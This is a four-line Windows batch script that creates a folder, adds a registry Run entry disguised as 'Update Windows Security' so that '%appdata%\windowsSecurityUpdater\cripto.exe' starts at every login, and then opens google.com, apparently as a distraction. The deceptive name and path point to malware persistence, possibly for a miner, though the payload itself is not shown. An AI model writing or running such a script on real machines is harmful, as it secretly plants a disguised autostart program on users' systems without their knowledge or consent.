@echo off
mkdir testtest
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Update Windows Security" /t REG_SZ /d "%appdata%\windowsSecurityUpdater\cripto.exe" /f
start www.google.com